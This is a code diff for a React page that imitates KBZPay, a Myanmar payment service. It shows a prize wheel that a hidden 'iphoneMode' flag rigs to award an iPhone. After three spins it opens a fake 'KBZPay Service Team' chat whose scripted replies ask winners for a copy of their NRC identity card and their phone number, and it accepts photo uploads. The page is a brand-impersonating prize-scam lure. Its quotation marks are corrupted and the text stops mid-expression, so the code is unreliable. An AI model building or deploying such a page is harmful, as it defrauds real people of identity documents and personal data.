@@ -1,0 +1,677 @@
+import { useState, useRef, useEffect, useCallback } from “react”;
+
+// ── PRIZES ────────────────────────────────────────────────────────────────────
+const PRIZES = [
+{ id:0, amount:10000,  display:“10,000”,  mmk:“တစ်သောင်း”,  color:”#FF2D55”, light:”#FF6B8A”, dark:”#C4002A” },
+{ id:1, amount:30000,  display:“30,000”,  mmk:“သုံးသောင်း”, color:”#FF6B00”, light:”#FFA040”, dark:”#C45000” },
+{ id:2, amount:50000,  display:“50,000”,  mmk:“ငါးသောင်း”,  color:”#FFD700”, light:”#FFE866”, dark:”#C4A000” },
+{ id:3, amount:100000, display:“100,000”, mmk:“တစ်သိန်း”,   color:”#00C853”, light:”#5EE88A”, dark:”#009A3E” },
+{ id:4, amount:300000, display:“300,000”, mmk:“သုံးသိန်း”,  color:”#00B8FF”, light:”#6DD8FF”, dark:”#0088C4” },
+{ id:5, amount:500000, display:“500,000”, mmk:“ငါးသိန်း”,   color:”#9C27FF”, light:”#C870FF”, dark:”#6A00C4” },
+{ id:6, amount:0, display:“အထူးဆု”, mmk:“iPhone 17”, color:”#FF2D8F”, light:”#FF80C0”, dark:”#C4006A”, isSpecial:true },
+];
+const N=PRIZES.length, SEG_DEG=360/N, SEG_RAD=(2*Math.PI)/N;
+
+function darken(hex,amt){const n=parseInt(hex.slice(1),16);return `rgb(${Math.max(0,((n>>16)&0xff)-amt)},${Math.max(0,((n>>8)&0xff)-amt)},${Math.max(0,(n&0xff)-amt)})`;}
+
+// ── DRAW WHEEL ────────────────────────────────────────────────────────────────
+function drawWheel(canvas){
+if(!canvas)return;
+const dpr=window.devicePixelRatio||1,W=canvas.offsetWidth,H=canvas.offsetHeight;
+canvas.width=W*dpr;canvas.height=H*dpr;
+const ctx=canvas.getContext(“2d”);ctx.scale(dpr,dpr);
+const cx=W/2,cy=H/2,R=Math.min(W,H)/2-6,rIn=R*0.20;
+ctx.save();ctx.shadowColor=“rgba(0,0,0,0.55)”;ctx.shadowBlur=32;ctx.shadowOffsetY=8;
+ctx.beginPath();ctx.arc(cx,cy,R+10,0,Math.PI*2);ctx.fillStyle=“transparent”;ctx.fill();ctx.restore();
+const rg=ctx.createLinearGradient(cx-R,cy-R,cx+R,cy+R);
+rg.addColorStop(0,”#FFF5A0”);rg.addColorStop(0.3,”#FFD700”);rg.addColorStop(0.7,”#C8860A”);rg.addColorStop(1,”#FFE566”);
+ctx.beginPath();ctx.arc(cx,cy,R+10,0,Math.PI*2);ctx.fillStyle=rg;ctx.fill();
+for(let i=0;i<28;i++){
+const a=(i/28)*Math.PI*2-Math.PI/2,gx=cx+Math.cos(a)*(R+5),gy=cy+Math.sin(a)*(R+5);
+const g=ctx.createRadialGradient(gx-1,gy-1,0,gx,gy,4.5),col=PRIZES[i%N].color;
+g.addColorStop(0,”#FFF”);g.addColorStop(0.4,col);g.addColorStop(1,darken(col,40));
+ctx.beginPath();ctx.arc(gx,gy,4.5,0,Math.PI*2);ctx.fillStyle=g;ctx.fill();
+ctx.strokeStyle=“rgba(255,255,255,0.6)”;ctx.lineWidth=0.8;ctx.stroke();
+}
+PRIZES.forEach((prize,i)=>{
+const sA=i*SEG_RAD-Math.PI/2,eA=sA+SEG_RAD,mA=sA+SEG_RAD/2;
+const gx1=cx+Math.cos(mA)*R*0.15,gy1=cy+Math.sin(mA)*R*0.15;
+const gx2=cx+Math.cos(mA)*R*0.98,gy2=cy+Math.sin(mA)*R*0.98;
+const sg=ctx.createLinearGradient(gx1,gy1,gx2,gy2);
+sg.addColorStop(0,prize.light);sg.addColorStop(0.45,prize.color);sg.addColorStop(1,prize.dark);
+ctx.beginPath();ctx.moveTo(cx,cy);ctx.arc(cx,cy,R,sA,eA);ctx.closePath();ctx.fillStyle=sg;ctx.fill();
+ctx.beginPath();ctx.moveTo(cx,cy);ctx.arc(cx,cy,R,sA,eA);ctx.closePath();
+ctx.strokeStyle=“rgba(255,255,255,0.55)”;ctx.lineWidth=2;ctx.stroke();
+ctx.save();ctx.beginPath();ctx.moveTo(cx,cy);ctx.arc(cx,cy,R*0.6,sA,eA);ctx.closePath();ctx.clip();
+const hg=ctx.createLinearGradient(gx1,gy1,gx2,gy2);
+hg.addColorStop(0,“rgba(255,255,255,0.22)”);hg.addColorStop(1,“rgba(255,255,255,0)”);
+ctx.fillStyle=hg;ctx.fill();ctx.restore();
+ctx.save();ctx.translate(cx,cy);ctx.rotate(mA+Math.PI/2);
+ctx.shadowColor=“rgba(0,0,0,0.7)”;ctx.shadowBlur=6;ctx.textAlign=“center”;ctx.textBaseline=“middle”;ctx.fillStyle=”#FFF”;
+if(prize.isSpecial){
+ctx.font=`${Math.round(R*0.13)}px serif`;ctx.fillText(“📱”,0,-(R*0.52));
+ctx.font=`900 ${Math.round(R*0.088)}px 'Segoe UI',sans-serif`;ctx.fillText(“အထူးဆု”,0,-(R*0.36));
+ctx.font=`700 ${Math.round(R*0.063)}px 'Segoe UI',sans-serif`;ctx.fillStyle=“rgba(255,255,255,0.85)”;ctx.fillText(“iPhone 17”,0,-(R*0.22));
+}else{
+ctx.font=`900 ${Math.round(R*0.108)}px 'Segoe UI',sans-serif`;ctx.fillText(prize.display,0,-(R*0.62));
+ctx.shadowBlur=3;ctx.font=`700 ${Math.round(R*0.068)}px 'Segoe UI',sans-serif`;ctx.fillStyle=“rgba(255,255,255,0.85)”;ctx.fillText(“MMK”,0,-(R*0.77)+R*0.012);
+ctx.shadowBlur=4;ctx.font=`${Math.round(R*0.11)}px serif`;ctx.fillStyle=”#FFF”;ctx.fillText(“🪙”,0,-(R*0.30));
+}
+ctx.restore();
+});
+const hg2=ctx.createRadialGradient(cx-rIn*0.3,cy-rIn*0.3,0,cx,cy,rIn);
+hg2.addColorStop(0,”#FFFDE0”);hg2.addColorStop(0.4,”#FFD700”);hg2.addColorStop(0.75,”#C8860A”);hg2.addColorStop(1,”#7A4F00”);
+ctx.beginPath();ctx.arc(cx,cy,rIn,0,Math.PI*2);ctx.fillStyle=hg2;ctx.fill();
+ctx.strokeStyle=“rgba(255,255,255,0.8)”;ctx.lineWidth=3;ctx.stroke();
+ctx.save();ctx.font=`900 ${Math.round(rIn*0.7)}px 'Segoe UI',sans-serif`;ctx.textAlign=“center”;ctx.textBaseline=“middle”;
+ctx.fillStyle=”#003580”;ctx.shadowColor=“rgba(255,255,255,0.6)”;ctx.shadowBlur=4;ctx.fillText(“K”,cx,cy);ctx.restore();
+}
+
+// ── CONFETTI ──────────────────────────────────────────────────────────────────
+function Confetti({trigger}){
+const cvs=useRef(null),raf=useRef(null),pts=useRef([]);
+useEffect(()=>{
+if(!trigger)return;
+const c=cvs.current,ctx=c.getContext(“2d”);
+c.width=c.offsetWidth;c.height=c.offsetHeight;
+pts.current=Array.from({length:160},()=>({x:Math.random()*c.width,y:-10-Math.random()*80,vx:(Math.random()-.5)*7,vy:Math.random()*5+2,color:PRIZES[Math.floor(Math.random()*N)].color,w:Math.random()*10+4,h:Math.random()*5+3,rot:Math.random()*360,rv:(Math.random()-.5)*12}));
+const draw=()=>{ctx.clearRect(0,0,c.width,c.height);pts.current.forEach(p=>{p.x+=p.vx;p.y+=p.vy;p.vy+=0.12;p.rot+=p.rv;ctx.save();ctx.translate(p.x,p.y);ctx.rotate(p.rot*Math.PI/180);ctx.fillStyle=p.color;ctx.globalAlpha=Math.max(0,1-p.y/c.height);ctx.fillRect(-p.w/2,-p.h/2,p.w,p.h);ctx.restore();});pts.current=pts.current.filter(p=>p.y<c.height+20);if(pts.current.length)raf.current=requestAnimationFrame(draw);else ctx.clearRect(0,0,c.width,c.height);};
+raf.current=requestAnimationFrame(draw);
+return()=>raf.current&&cancelAnimationFrame(raf.current);
+},[trigger]);
+return <canvas ref={cvs} style={{position:“absolute”,inset:0,width:“100%”,height:“100%”,pointerEvents:“none”,zIndex:50}}/>;
+}
+
+// ── RESULT POPUP ──────────────────────────────────────────────────────────────
+function ResultPopup({prize,onClose}){
+return(
+<div style={{position:“fixed”,inset:0,zIndex:200,background:“rgba(0,0,0,0.82)”,display:“flex”,alignItems:“center”,justifyContent:“center”,backdropFilter:“blur(12px)”,animation:“fdIn .25s ease”}}>
+<div style={{background:“linear-gradient(150deg,#0C1A40 0%,#162E60 60%,#0C1A40 100%)”,border:`2.5px solid ${prize.color}`,borderRadius:28,padding:“36px 28px 28px”,maxWidth:320,width:“88%”,textAlign:“center”,boxShadow:`0 0 80px ${prize.color}55,0 24px 60px rgba(0,0,0,0.6)`,animation:“popUp .4s cubic-bezier(.175,.885,.32,1.275)”,position:“relative”,overflow:“hidden”}}>
+<div style={{position:“absolute”,inset:0,background:`radial-gradient(circle at 50% 30%,${prize.color}22 0%,transparent 65%)`,pointerEvents:“none”}}/>
+<div style={{fontSize:52,lineHeight:1,marginBottom:8}}>{prize.isSpecial?“🏆”:“🎉”}</div>
+<div style={{color:“rgba(255,255,255,0.55)”,fontSize:12,fontWeight:700,letterSpacing:2,marginBottom:4}}>ဂုဏ်ယူပါသည်!</div>
+<div style={{color:“rgba(255,255,255,0.3)”,fontSize:11,marginBottom:20}}>CONGRATULATIONS</div>
+<div style={{background:`linear-gradient(135deg,${prize.color}25,${prize.color}10)`,border:`1.5px solid ${prize.color}70`,borderRadius:20,padding:“20px 16px”,marginBottom:22}}>
+{prize.isSpecial?(
+<><div style={{fontSize:48,marginBottom:8}}>📱</div>
+<div style={{color:prize.color,fontSize:22,fontWeight:900,textShadow:`0 0 30px ${prize.color}99`}}>iPhone 17 Pro Max</div>
+<div style={{color:“rgba(255,255,255,0.5)”,fontSize:12,marginTop:8}}>🎊 အထူးဆုကြီး ရရှိပါသည်!</div></>
+):(
+<><div style={{color:“rgba(255,255,255,0.55)”,fontSize:13,marginBottom:6}}>သင်ရရှိသောဆုငွေ</div>
+<div style={{color:prize.color,fontSize:42,fontWeight:900,letterSpacing:-1,textShadow:`0 0 30px ${prize.color}99`,lineHeight:1}}>{prize.display}</div>
+<div style={{color:“rgba(255,255,255,0.4)”,fontSize:13,marginTop:6}}>ကျပ် · {prize.mmk}</div></>
+)}
+</div>
+<button onClick={onClose} style={{width:“100%”,padding:“15px”,borderRadius:14,border:“none”,background:“linear-gradient(135deg,#FFE566,#FFD700,#FF8C00)”,color:”#1A0800”,fontSize:16,fontWeight:900,cursor:“pointer”,boxShadow:“0 6px 24px rgba(255,165,0,0.4)”}}>✓ ကောင်းပြီ</button>
+</div>
+</div>
+);
+}
+
+// ── CHAT SCREEN ───────────────────────────────────────────────────────────────
+function ChatScreen({onBack,winHistory}){
+const [msgs,setMsgs]=useState([
+{id:0,from:“agent”,text:“မင်္ဂလာပါ! KBZPay Customer Service မှ ကြိုဆိုပါသည်။ Lucky Draw ဆုငွေနှင့်ပတ်သက်၍ မည်သို့ကူညီပေးရမည်နည်း? 😊”,time:“ယခု”}
+]);
+const [input,setInput]=useState(””);
+const [imgPreviews,setImgPreviews]=useState([]);
+const fileRef=useRef(null);
+const bottomRef=useRef(null);
+const msgId=useRef(1);
+
+useEffect(()=>{ bottomRef.current?.scrollIntoView({behavior:“smooth”}); },[msgs]);
+
+const agentReply=(userMsg)=>{
+const replies=[
+“ကျေးဇူးတင်ပါသည်! သင်၏ ဆုငွေကို ၃–၅ ရက်အတွင်း သင်၏ KBZPay account သို့ ပေးပို့ပါမည်။”,
+“သင်၏ Lucky Draw ဆုကို အတည်ပြုပြီးပါပြီ။ NRC ကဒ်ပြားမိတ္တူ ပေးပို့ပေးပါ။”,
+“ဆုငွေ ထုတ်ယူရန် သင်၏ Phone Number ကို ပြောပြပေးပါ။”,
+“ကျွန်ုပ်တို့ Team မှ အမြန်ဆုံး ဆောင်ရွက်ပေးပါမည်။ ကျေးဇူးတင်ပါသည်! 🙏”,
+];
+setTimeout(()=>{
+setMsgs(m=>[…m,{id:msgId.current++,from:“agent”,text:replies[Math.floor(Math.random()*replies.length)],time:“ယခု”}]);
+},1000+Math.random()*1000);
+};
+
+const sendMsg=()=>{
+const txt=input.trim();
+if(!txt&&imgPreviews.length===0)return;
+const newMsg={id:msgId.current++,from:“user”,text:txt,images:imgPreviews,time:“ယခု”};
+setMsgs(m=>[…m,newMsg]);
+setInput(””);setImgPreviews([]);
+if(txt)agentReply(txt);
+else agentReply(”(ဓာတ်ပုံ)”);
+};
+
+const handleFile=(e)=>{
+const files=Array.from(e.target.files||[]);
+files.forEach(f=>{
+const reader=new FileReader();
+reader.onload=(ev)=>setImgPreviews(p=>[…p,ev.target.result]);
+reader.readAsDataURL(f);
+});
+e.target.value=””;
+};
+
+const removeImg=(idx)=>setImgPreviews(p=>p.filter((_,i)=>i!==idx));
+
+return(
+<div style={{minHeight:“100vh”,background:”#0A1428”,display:“flex”,flexDirection:“column”,maxWidth:480,margin:“0 auto”,fontFamily:”‘Segoe UI’,system-ui,sans-serif”}}>
+{/* Header */}
+<div style={{background:“linear-gradient(135deg,#005DB8,#0077E6)”,padding:“0 16px”,paddingTop:“env(safe-area-inset-top,0)”,flexShrink:0,boxShadow:“0 2px 20px rgba(0,93,184,0.5)”}}>
+<div style={{display:“flex”,alignItems:“center”,gap:12,padding:“12px 0”}}>
+<button onClick={onBack} style={{background:“rgba(255,255,255,0.2)”,border:“none”,borderRadius:10,width:38,height:38,color:“white”,fontSize:20,cursor:“pointer”,display:“flex”,alignItems:“center”,justifyContent:“center”,flexShrink:0}}>←</button>
+<div style={{width:42,height:42,borderRadius:14,background:“white”,display:“flex”,alignItems:“center”,justifyContent:“center”,flexShrink:0,boxShadow:“0 2px 8px rgba(0,0,0,0.2)”}}>
+<div style={{display:“flex”,flexDirection:“column”,alignItems:“center”,lineHeight:1}}>
+<span style={{color:”#005DB8”,fontWeight:900,fontSize:13}}>KBZ</span>
+<span style={{color:”#005DB8”,fontWeight:700,fontSize:9}}>Pay</span>
+</div>
+</div>
+<div style={{flex:1,minWidth:0}}>
+<div style={{color:“white”,fontWeight:800,fontSize:15}}>KBZPay Service Team</div>
+<div style={{color:“rgba(255,255,255,0.7)”,fontSize:11,display:“flex”,alignItems:“center”,gap:4}}>
+<span style={{width:7,height:7,borderRadius:“50%”,background:”#4AFF91”,display:“inline-block”}}/>
+Online · ဝန်ဆောင်မှုပေးနေသည်
+</div>
+</div>
+<div style={{color:“rgba(255,255,255,0.6)”,fontSize:11,textAlign:“right”,flexShrink:0}}>
+<div>24/7</div><div>Support</div>
+</div>
+</div>
+</div>
+
+```
+  {/* Win summary banner */}
+  {winHistory.length>0&&(
+    <div style={{background:"rgba(255,215,0,0.08)",borderBottom:"1px solid rgba(255,215,0,0.15)",padding:"10px 16px",flexShrink:0}}>
+      <div style={{color:"rgba(255,255,255,0.4)",fontSize:10,fontWeight:700,letterSpacing:1,marginBottom:5}}>📋 သင်၏ Lucky Draw ရလဒ်</div>
+      <div style={{display:"flex",gap:6,flexWrap:"wrap"}}>
+        {winHistory.map((h,i)=>(
+          <div key={i} style={{padding:"3px 10px",borderRadius:20,background:`${h.color}18`,border:`1px solid ${h.color}40`,color:h.color,fontSize:11,fontWeight:800}}>
+            {h.isSpecial?"📱 iPhone":h.display+" MMK"}
+          </div>
+        ))}
+      </div>
+    </div>
+  )}
+
+  {/* Messages */}
+  <div style={{flex:1,overflowY:"auto",padding:"16px",display:"flex",flexDirection:"column",gap:12}}>
+    {/* Info chip */}
+    <div style={{textAlign:"center",marginBottom:4}}>
+      <span style={{background:"rgba(255,255,255,0.06)",border:"1px solid rgba(255,255,255,0.08)",borderRadius:20,padding:"5px 14px",color:"rgba(255,255,255,0.3)",fontSize:11}}>
+        🔒 ဤ chat သည် လုံခြုံပါသည်
+      </span>
+    </div>
+
+    {msgs.map(msg=>(
+      <div key={msg.id} style={{display:"flex",flexDirection:"column",alignItems:msg.from==="user"?"flex-end":"flex-start",gap:4}}>
+        {msg.from==="agent"&&(
+          <div style={{display:"flex",alignItems:"center",gap:6,marginLeft:4}}>
+            <div style={{width:26,height:26,borderRadius:8,background:"linear-gradient(135deg,#005DB8,#0099FF)",display:"flex",alignItems:"center",justifyContent:"center",flexShrink:0}}>
+              <span style={{color:"white",fontSize:12,fontWeight:900}}>K</span>
+            </div>
+            <span style={{color:"rgba(255,255,255,0.3)",fontSize:11}}>KBZPay Service</span>
+          </div>
+        )}
+        <div style={{maxWidth:"78%"}}>
+          {/* Images */}
+          {msg.images&&msg.images.length>0&&(
+            <div style={{display:"flex",gap:6,flexWrap:"wrap",marginBottom:msg.text?6:0,justifyContent:msg.from==="user"?"flex-end":"flex-start"}}>
+              {msg.images.map((src,ii)=>(
+                <img key={ii} src={src} alt="" style={{width:130,height:110,objectFit:"cover",borderRadius:12,border:"1px solid rgba(255,255,255,0.1)"}}/>
+              ))}
+            </div>
+          )}
+          {/* Text bubble */}
+          {msg.text&&(
+            <div style={{
+              background:msg.from==="user"?"linear-gradient(135deg,#005DB8,#0077E6)":"rgba(255,255,255,0.07)",
+              border:msg.from==="agent"?"1px solid rgba(255,255,255,0.08)":"none",
+              borderRadius:msg.from==="user"?"18px 18px 4px 18px":"18px 18px 18px 4px",
+              padding:"11px 15px",
+              color:"white",fontSize:14,lineHeight:1.55,wordBreak:"break-word",
+            }}>
+              {msg.text}
+            </div>
+          )}
+          <div style={{color:"rgba(255,255,255,0.2)",fontSize:10,marginTop:3,textAlign:msg.from==="user"?"right":"left",paddingLeft:msg.from==="agent"?4:0,paddingRight:msg.from==="user"?4:0}}>
+            {msg.time}
+          </div>
+        </div>
+      </div>
+    ))}
+
+    {/* Typing indicator */}
+    <div style={{display:"flex",alignItems:"center",gap:6}}>
+      <div style={{width:26,height:26,borderRadius:8,background:"linear-gradient(135deg,#005DB8,#0099FF)",display:"flex",alignItems:"center",justifyContent:"center"}}>
+        <span style={{color:"white",fontSize:12,fontWeight:900}}>K</span>
+      </div>
+      <div style={{background:"rgba(255,255,255,0.07)",border:"1px solid rgba(255,255,255,0.08)",borderRadius:"18px 18px 18px 4px",padding:"12px 16px",display:"flex",gap:4,alignItems:"center"}}>
+        {[0,1,2].map(i=>(
+          <div key={i} style={{width:6,height:6,borderRadius:"50%",background:"rgba(255,255,255,0.4)",animation:`typeDot 1.2s ${i*0.2}s ease-in-out infinite`}}/>
+        ))}
+      </div>
+    </div>
+    <div ref={bottomRef}/>
+  </div>
+
+  {/* Image preview strip */}
+  {imgPreviews.length>0&&(
+    <div style={{background:"rgba(255,255,255,0.04)",borderTop:"1px solid rgba(255,255,255,0.07)",padding:"10px 16px",flexShrink:0}}>
+      <div style={{display:"flex",gap:8,overflowX:"auto"}}>
+        {imgPreviews.map((src,i)=>(
+          <div key={i} style={{position:"relative",flexShrink:0}}>
+            <img src={src} alt="" style={{width:68,height:68,objectFit:"cover",borderRadius:10,border:"1.5px solid rgba(255,255,255,0.12)"}}/>
+            <button onClick={()=>removeImg(i)} style={{position:"absolute",top:-6,right:-6,width:20,height:20,borderRadius:"50%",background:"#FF3B30",border:"none",color:"white",fontSize:12,cursor:"pointer",display:"flex",alignItems:"center",justifyContent:"center",lineHeight:1}}>×</button>
+          </div>
+        ))}
+      </div>
+    </div>
+  )}
+
+  {/* Input bar */}
+  <div style={{background:"rgba(255,255,255,0.04)",borderTop:"1px solid rgba(255,255,255,0.07)",padding:"10px 12px",flexShrink:0,display:"flex",alignItems:"flex-end",gap:8,paddingBottom:"calc(10px + env(safe-area-inset-bottom,0px))"}}>
+    {/* Photo button */}
+    <button onClick={()=>fileRef.current?.click()} style={{background:"rgba(255,255,255,0.08)",border:"1px solid rgba(255,255,255,0.1)",borderRadius:12,width:42,height:42,color:"white",fontSize:20,cursor:"pointer",display:"flex",alignItems:"center",justifyContent:"center",flexShrink:0,transition:"background 0.2s"}}>
+      📷
+    </button>
+    <input type="file" ref={fileRef} accept="image/*" multiple onChange={handleFile} style={{display:"none"}}/>
+
+    {/* Text input */}
+    <div style={{flex:1,background:"rgba(255,255,255,0.07)",border:"1px solid rgba(255,255,255,0.1)",borderRadius:16,padding:"10px 14px",minHeight:42,display:"flex",alignItems:"center"}}>
+      <textarea
+        value={input}
+        onChange={e=>setInput(e.target.value)}
+        onKeyDown={e=>{if(e.key==="Enter"&&!e.shiftKey){e.preventDefault();sendMsg();}}}
+        placeholder="စာရိုက်ပါ..."
+        rows={1}
+        style={{background:"none",border:"none",outline:"none",color:"white",fontSize:14,width:"100%",resize:"none",fontFamily:"inherit",lineHeight:1.4,maxHeight:96,overflow:"auto",caretColor:"#0099FF"}}
+      />
+    </div>
+
+    {/* Send button */}
+    <button onClick={sendMsg} disabled={!input.trim()&&imgPreviews.length===0} style={{background:(!input.trim()&&imgPreviews.length===0)?"rgba(255,255,255,0.08)":"linear-gradient(135deg,#005DB8,#0077E6)",border:"none",borderRadius:12,width:42,height:42,color:"white",fontSize:18,cursor:(!input.trim()&&imgPreviews.length===0)?"default":"pointer",display:"flex",alignItems:"center",justifyContent:"center",flexShrink:0,transition:"all 0.2s",boxShadow:(!input.trim()&&imgPreviews.length===0)?"none":"0 4px 12px rgba(0,93,184,0.4)"}}>
+      ➤
+    </button>
+  </div>
+</div>
+```
+
+);
+}
+
+// ── CONTACT BANNER (after 3 spins) ───────────────────────────────────────────
+function ContactBanner({onChat}){
+return(
+<div style={{animation:“slideUp 0.5s ease”,width:“min(86vw,350px)”,position:“relative”,zIndex:5,marginTop:4}}>
+<div style={{background:“linear-gradient(135deg,#001E55,#002A7A)”,border:“2px solid rgba(0,119,230,0.5)”,borderRadius:20,padding:“18px 18px 16px”,boxShadow:“0 8px 32px rgba(0,93,184,0.35)”}}>
+<div style={{display:“flex”,alignItems:“center”,gap:10,marginBottom:12}}>
+<div style={{width:40,height:40,borderRadius:12,background:“linear-gradient(135deg,#005DB8,#0099FF)”,display:“flex”,alignItems:“center”,justifyContent:“center”,flexShrink:0,fontSize:20}}>💳</div>
+<div>
+<div style={{color:“white”,fontSize:14,fontWeight:800,lineHeight:1.3}}>ဆုငွေ ထုတ်ယူလိုပါသလား?</div>
+<div style={{color:“rgba(255,255,255,0.45)”,fontSize:11,marginTop:2}}>KBZ Service Team သို့ ဆက်သွယ်ပါ</div>
+</div>
+</div>
+<button onClick={onChat} style={{width:“100%”,padding:“14px 0”,borderRadius:14,border:“none”,background:“linear-gradient(135deg,#005DB8 0%,#0077E6 50%,#0099FF 100%)”,color:“white”,fontSize:15,fontWeight:900,cursor:“pointer”,boxShadow:“0 6px 20px rgba(0,93,184,0.5)”,display:“flex”,alignItems:“center”,justifyContent:“center”,gap:10,animation:“kpayPulse 2s ease-in-out infinite”}}>
+<span style={{fontSize:18}}>💬</span>
+<span>KBZ Service Team သို့ ဆက်သွယ်ပါ</span>
+</button>
+<div style={{textAlign:“center”,marginTop:8,color:“rgba(255,255,255,0.2)”,fontSize:11}}>24/7 Customer Support</div>
+</div>
+</div>
+);
+}
+
+// ── SPIN SCREEN ───────────────────────────────────────────────────────────────
+function SpinScreen({onChat,iphoneMode}){
+const canvasRef=useRef(null);
+const rotRef=useRef(0);
+const [rotation,setRotation]=useState(0);
+const [spinning,setSpinning]=useState(false);
+const [winner,setWinner]=useState(null);
+const [confetti,setConfetti]=useState(0);
+const [history,setHistory]=useState([]);
+const [spinsLeft,setSpinsLeft]=useState(3);
+const [showContact,setShowContact]=useState(false);
+
+useEffect(()=>{ drawWheel(canvasRef.current); },[]);
+
+const handleSpin=useCallback(()=>{
+if(spinning||spinsLeft<=0)return;
+let winIdx;
+if(iphoneMode){winIdx=6;}
+else{
+const weights=[35,28,18,10,5,3,1],total=weights.reduce((a,b)=>a+b,0);
+let pick=Math.random()*total;winIdx=0;
+for(let i=0;i<weights.length;i++){pick-=weights[i];if(pick<=0){winIdx=i;break;}}
+}
+const segCenter=(winIdx+0.5)*SEG_DEG,cur=rotRef.current;
+const extra=((-(segCenter+cur))%360+360)%360;
+const totalDelta=(6+Math.floor(Math.random()*4))*360+(extra===0?360:extra);
+rotRef.current=cur+totalDelta;
+setRotation(cur+totalDelta);setSpinning(true);setSpinsLeft(s=>s-1);
+setTimeout(()=>{
+setSpinning(false);setWinner(PRIZES[winIdx]);setConfetti(c=>c+1);
+const updated=[PRIZES[winIdx],…history].slice(0,6);
+setHistory(updated);
+if(spinsLeft-1<=0) setTimeout(()=>setShowContact(true),600);
+},5200);
+},[spinning,spinsLeft,history,iphoneMode]);
+
+return(
+<div style={{minHeight:“100vh”,background:“linear-gradient(175deg,#020C1F 0%,#061435 35%,#0A1E55 65%,#020C1F 100%)”,display:“flex”,flexDirection:“column”,alignItems:“center”,position:“relative”,overflow:“hidden”,userSelect:“none”}}>
+{Array.from({length:55},(_,i)=>(
+<div key={i} style={{position:“absolute”,left:`${(i*17+7)%100}%`,top:`${(i*13+3)%100}%`,width:i%4===0?3:1.5,height:i%4===0?3:1.5,borderRadius:“50%”,background:“white”,animation:`twinkle ${1.5+(i%5)*0.4}s ${(i%6)*0.3}s ease-in-out infinite`,pointerEvents:“none”}}/>
+))}
+<Confetti trigger={confetti}/>
+
+```
+  {/* Header */}
+  <div style={{width:"100%",maxWidth:430,padding:"18px 20px 10px",display:"flex",alignItems:"center",justifyContent:"space-between",position:"relative",zIndex:5}}>
+    <div style={{background:"white",borderRadius:12,padding:"6px 14px",display:"flex",alignItems:"center",gap:2,boxShadow:"0 2px 12px rgba(0,93,184,0.3)"}}>
+      <span style={{color:"#005DB8",fontWeight:900,fontSize:17}}>KBZ</span>
+      <span style={{color:"#005DB8",fontWeight:700,fontSize:13}}> Pay</span>
+    </div>
+    <div style={{background:"rgba(255,215,0,0.12)",border:"1px solid rgba(255,215,0,0.35)",borderRadius:20,padding:"6px 16px",textAlign:"center"}}>
+      <div style={{color:"rgba(255,255,255,0.5)",fontSize:10,fontWeight:700,letterSpacing:1}}>SPINS LEFT</div>
+      <div style={{color:"#FFD700",fontWeight:900,fontSize:22,lineHeight:1}}>{spinsLeft}</div>
+    </div>
+  </div>
+
+  <div style={{textAlign:"center",padding:"2px 16px 4px",position:"relative",zIndex:5}}>
+    <div style={{fontSize:26,fontWeight:900,background:"linear-gradient(90deg,#FFE566,#FFD700,#FF8C00)",WebkitBackgroundClip:"text",WebkitTextFillColor:"transparent",backgroundClip:"text"}}>Lucky Draw 🎰</div>
+    <div style={{color:"rgba(255,255,255,0.4)",fontSize:12,marginTop:2}}>KBZPay · ကံစမ်းလှော်ပြိုင်ပွဲ</div>
+  </div>
+
+  <div style={{display:"flex",gap:5,flexWrap:"wrap",justifyContent:"center",padding:"5px 20px 8px",maxWidth:430,position:"relative",zIndex:5}}>
+    {PRIZES.map(p=>(
+      <div key={p.id} style={{padding:"3px 9px",borderRadius:20,background:`${p.color}1A`,border:`1.5px solid ${p.color}60`,color:p.color,fontSize:10,fontWeight:800}}>
+        {p.isSpecial?"📱 iPhone":p.display}
+      </div>
+    ))}
+  </div>
+
+  {/* Wheel */}
+  <div style={{position:"relative",width:"min(82vw,330px)",height:"min(82vw,330px)",margin:"2px auto 0",zIndex:5,flexShrink:0}}>
+    <div style={{position:"absolute",inset:-18,borderRadius:"50%",background:"conic-gradient(#FF2D55,#FF6B00,#FFD700,#00C853,#00B8FF,#9C27FF,#FF2D8F,#FF2D55)",animation:"spinRing 5s linear infinite",opacity:spinning?0.65:0.22,transition:"opacity 0.5s"}}/>
+    <div style={{position:"absolute",inset:-6,borderRadius:"50%",background:"transparent",boxShadow:"0 0 0 8px #041240"}}/>
+    <div style={{position:"absolute",top:-24,left:"50%",transform:"translateX(-50%)",zIndex:10,filter:"drop-shadow(0 3px 8px rgba(0,0,0,0.7))"}}>
+      <svg width="32" height="38" viewBox="0 0 36 42">
+        <defs><linearGradient id="ptr" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stopColor="#FFF5A0"/><stop offset="100%" stopColor="#C8860A"/></linearGradient></defs>
+        <polygon points="18,40 1,6 35,6" fill="url(#ptr)" stroke="#FFFDE0" strokeWidth="1.5"/>
+        <circle cx="18" cy="8" r="7" fill="#FFD700" stroke="white" strokeWidth="2.5"/>
+        <circle cx="18" cy="8" r="3" fill="white" opacity="0.6"/>
+      </svg>
+    </div>
+    <canvas ref={canvasRef} style={{width:"100%",height:"100%",display:"block",borderRadius:"50%",transform:`rotate(${rotation}deg)`,transition:spinning?"transform 5s cubic-bezier(0.08,0.6,0.12,1.0)":"none",filter:"drop-shadow(0 0 26px rgba(255,215,0,0.45))"}}/>
+  </div>
+
+  {/* Spin button */}
+  <div style={{width:"min(82vw,330px)",margin:"14px auto 6px",position:"relative",zIndex:5}}>
+    <button onClick={handleSpin} disabled={spinning||spinsLeft<=0} style={{width:"100%",padding:"18px 0",borderRadius:20,border:"none",cursor:spinning||spinsLeft<=0?"not-allowed":"pointer",fontSize:19,fontWeight:900,letterSpacing:1.5,background:spinning||spinsLeft<=0?"linear-gradient(135deg,#2a2a4a,#1a1a3a)":"linear-gradient(135deg,#FFE566 0%,#FFD700 35%,#FF8C00 70%,#FF5500 100%)",color:spinning||spinsLeft<=0?"rgba(255,255,255,0.25)":"#1A0500",animation:spinning||spinsLeft<=0?"none":"pulse 2s ease-in-out infinite",transition:"transform .15s",transform:spinning?"scale(0.96)":"scale(1)",display:"flex",alignItems:"center",justifyContent:"center",gap:10}}>
+      {spinning?(
+        <><div style={{width:20,height:20,borderRadius:"50%",border:"3px solid rgba(255,255,255,0.2)",borderTop:"3px solid rgba(255,255,255,0.7)",animation:"spinRing 0.7s linear infinite"}}/> လည်နေသည်...</>
+      ):spinsLeft<=0?"🔒 ကြိမ်ကုန်သွားပြီ":<>🎰 SPIN NOW</>}
+    </button>
+    {!spinning&&spinsLeft>0&&(
